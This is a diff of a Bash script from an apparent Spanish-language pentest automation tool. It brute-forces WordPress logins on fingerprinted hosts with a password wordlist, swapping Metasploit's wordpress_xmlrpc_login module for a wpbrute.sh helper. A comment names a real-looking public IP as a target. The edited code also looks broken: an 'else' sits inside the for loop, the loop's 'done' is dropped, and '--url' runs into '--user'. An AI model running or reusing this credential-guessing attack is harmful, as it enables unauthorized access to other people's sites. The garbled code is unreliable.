@@ -236,35 +236,20 @@ then
 
 		
 		if [[ $fingerprint = *"wordpress"* ]]; then
-			echo -e "$OKGREEN \t[+] Wordpress identificado en $host:$port $RESET"						
+			echo -e "$OKGREEN \t[+] Wordpress identificado en $host:$port $RESET"
+			ip_port_path=`echo $ip_port_path |sed 's/wp-login.php//g'`
+
 			echo -e "\t[+] Probando contraseñas comunes ...."
 			if [ -f ".vulnerabilidades2/"$host"_"$port"_wpUsers.txt" ]; then
 				#https://181.115.188.36:443/				
 				for user in $(cat .vulnerabilidades2/"$host"_"$port"_wpUsers.txt | awk '{print $2}'); do
 					echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
-					#Dominio
-					if [[ "$host" == *"bo" || "$host" == *"com"  || "$host" == *"net" || "$host" == *"org" || "$host" == *"net" ]];then 
-						real_ip=`host $host | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME $user ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME $user ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-					fi			
-				done
-			else
-				echo -e "\t\t[+] Probando con usuario admin"
-				#$host = dominio
-					if [[ "$host" == *"bo" || "$host" == *"com"  || "$host" == *"net" || "$host" == *"org" || "$host" == *"net" ]];then 
-						real_ip=`host $host | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $real_ip;set VHOST $host; set USERNAME admin ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_web ;run;exit\""  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set rhosts $host; set rport $port; set USERNAME admin ; set TARGETURI $path_web ;run;exit"  >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-					fi										
+					wpbrute.sh --url=$ip_port_path--user=$user --wordlist=passwords.txt >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+				else
+				echo -e "\t\t[+] Probando con usuario admin"				
+				wpbrute.sh --url=$ip_port_path--user=admin --wordlist=passwords.txt >> logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 			fi						
-			grep --color=never -i 'SUCCESS' logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordAdivinadoServ.txt 									
+			grep --color=never -i 'the password is' logs/cracking/"$host"_"$port"_passwordAdivinadoServ.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordAdivinadoServ.txt 									
 		fi	
 		
 		if [[ $fingerprint = *"phpmyadmin"* ]]; then
